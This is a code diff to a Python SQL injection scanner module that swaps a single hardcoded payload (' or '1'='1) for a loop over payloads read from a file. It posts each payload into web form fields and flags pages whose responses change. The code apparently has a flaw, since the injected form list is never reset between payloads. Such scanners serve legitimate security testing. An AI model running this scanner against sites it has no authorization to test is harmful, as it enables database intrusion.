@@ -8,6 +8,7 @@ EXPLOIT_PATH = "exploits/"
 EXPLOIT_TYPE = "sqli"
 EXPLOIT_CLASS = "SQL Injection"
 
+SQL_EXPLOIT_LIST = "tools/sql.txt"
 
 class SQLIModule:
     """
@@ -66,11 +67,6 @@ class SQLIModule:
                 injection_forms = []
                 # Change this to permutate
                 # self.craft_injection_form(forms) In progress
-                for form_input in forms:
-                    if form_input[0] == "csrftoken": # We don't have incentive to change this
-                        injection_forms.append(form_input)
-                    else:
-                        injection_forms.append((form_input[0], "' or '1'='1"))
                 random_forms = []
                 for form_input in forms:
                     if form_input[0] == "csrftoken": # We don't have incentive to change this
@@ -78,10 +74,20 @@ class SQLIModule:
                     else:
                         random_forms.append((form_input[0], "absldkjf"))
                 random_response = post_request(web_page, random_forms)
-                new_response = post_request(web_page, injection_forms)
-                if original_response != new_response and new_response != random_response: # That means that the webpage is different, possibly a successful case
-                    print(web_page)
-                    results.append((urlparse(web_page).path, create_post_params(injection_forms), "POST"))
+
+                sql_exploit_file = open(SQL_EXPLOIT_LIST, "r")
+                sql_exploit_list = [x.strip() for x in sql_exploit_file.readlines()] 
+                for exploit in sql_exploit_list:
+
+                    for form_input in forms:
+                        if form_input[0] == "csrftoken": # We don't have incentive to change this
+                            injection_forms.append(form_input)
+                        else:
+                            injection_forms.append((form_input[0], exploit))
+                    new_response = post_request(web_page, injection_forms)
+                    if original_response != new_response and new_response != random_response: # That means that the webpage is different, possibly a successful case
+                        results.append((urlparse(web_page).path, create_post_params(injection_forms), "POST"))
+                        break
             # elif self.has_get_params(web_page) an9d urlparse(web_page).path not in get_param_pages:
                 # GET version
 
